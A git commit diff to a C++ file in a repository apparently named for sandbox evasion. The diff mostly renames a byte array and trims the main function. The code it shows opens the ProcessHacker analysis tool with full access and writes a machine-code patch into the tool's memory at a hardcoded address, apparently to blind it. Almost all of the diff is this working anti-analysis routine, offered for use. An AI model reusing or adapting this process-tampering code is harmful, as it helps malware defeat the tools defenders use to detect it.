a273fb05f9f6c54da76f1be0bd6feeab63f0ba7e
V2 <60795188+ZeroMemoryEx@users.noreply.github.com>
2022-08-10 23:54:07 +0100

    Update Source.cpp

--- Bypass-Sandbox-Evasion/Source.cpp
+++ Bypass-Sandbox-Evasion/Source.cpp
@@ -5,7 +5,7 @@
 
  | 3648:C701 C97D2704                                                       |
 */
-unsigned long long lv2[] = { 0x36, 0x48, 0xC7, 0x01, 0x40, 0xB8, 0x93, 0x41, 0xC3 ,
+unsigned long long patch[] = { 0x36, 0x48, 0xC7, 0x01, 0x40, 0xB8, 0x93, 0x41, 0xC3 ,
 							0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
 							, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
 };
@@ -39,15 +39,14 @@ DWORD GetPID(const char* pn)
 	return procId;
 }
 
-int wmain(int argc, char* argv[]) {
+int wmain() {
 	int i = 0;
-	DWORD tpid = 0;
-	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, tpid = GetPID("ProcessHacker.exe"));
+	HANDLE hw = OpenProcess(PROCESS_ALL_ACCESS, 0, GetPID("ProcessHacker.exe"));
 	if (!hw)
 		return -2;
 
-	while (i < (sizeof(lv2) / 8))
-		WriteProcessMemory(hw, (LPVOID)(0x00007FFB942C1AE0 + i), &lv2[i++], 1, 0);
+	while (i < (sizeof(patch) / 8))
+		WriteProcessMemory(hw, (LPVOID)(0x00007FFB942C1AE0 + i), &patch[i++], 1, 0);
 
 	system("pasue");
 	return 0;
